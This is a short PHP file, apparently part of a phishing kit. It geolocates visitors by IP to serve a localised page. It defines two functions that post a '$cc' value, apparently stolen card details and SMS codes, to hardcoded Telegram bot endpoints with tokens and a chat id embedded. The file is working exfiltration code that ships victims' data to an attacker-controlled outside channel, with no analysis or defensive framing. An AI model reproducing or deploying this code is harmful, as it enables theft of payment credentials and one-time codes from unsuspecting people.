<?php

function get_user_country() {
    $details = json_decode(file_get_contents("http://ip-api.com/json/". $_SERVER['REMOTE_ADDR']."" ));
    if ($details && $details->country != null) {
        $countrycode = $details->countryCode;
    }
    return $countrycode;
}

  function getLocation(){


$lang = get_user_country();
if ($lang == 'IT') {
  $lang_user = 'it.php';
}elseif ($lang == 'EN') {
  $lang_user = 'en.php';
}elseif ($lang == 'ES') {
   $lang_user = 'es.php';
}elseif ($lang == 'FR') {
  $lang_user = 'fr.php';
}elseif ($lang == 'DE') {
  $lang_user = 'de.php';
}elseif ($lang == 'NL') {
  $lang_user = 'no.php';
}elseif ($lang == 'DK') {
  $lang_user = 'dk.php';
}else{
   $lang_user = 'en.php';
}
 return  $lang_user;

  }
  
  


function functiondilih($cc) {
  
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1329069942:AAGg-L8UWXp99MXiVvwu1b8hfijdeUXrwM4/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=1124183389&text=".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}


function functiondilihsms($cc) {
  
    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.telegram.org/bot1263631241:AAEN7eTJvfO0lJCD97eZdQXkuMSo2mmqep4/sendMessage');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=1124183389&text=".$cc."");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

curl_close ($ch);

}



  
  

?>